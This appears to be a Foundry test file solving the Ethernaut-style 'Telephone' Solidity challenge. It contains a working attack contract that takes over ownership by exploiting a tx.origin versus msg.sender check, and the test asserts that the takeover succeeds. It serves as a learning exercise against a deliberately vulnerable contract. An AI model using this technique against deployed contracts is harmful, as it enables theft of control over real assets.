// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Telephone} from "../src/Telephone.sol";


contract TelephoneAttack {
    Telephone public telephone;
    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function attack(address attacker) public {
        telephone.changeOwner(attacker);
    }
}

contract TelephoneTest is Test {
    /*
     * We have created a 'TelephoneAttack' because of the condition - tx.origin != msg.sender
     *
     * We deploy a helper attacker contract so we get:
     * tx.origin = attacker (EOA)
     * msg.sender = TelephoneAttack (contract)
     * Since tx.origin != msg.sender, the Telephone contract
     */
    Telephone public telephoneTest;
    TelephoneAttack public exploit;
    address public attacker = address(0xBEEF);

    function setUp() public {
        telephoneTest = new Telephone();
        exploit = new TelephoneAttack(address(telephoneTest));
    }

    function testTelephoneAttack() public {
        vm.startPrank(attacker);

//        Calling the deployed contract's function as that needs to be triggered to carry forward the attack
        exploit.attack(attacker);
        assertEq(telephoneTest.owner(), attacker);

        vm.stopPrank();
    }
}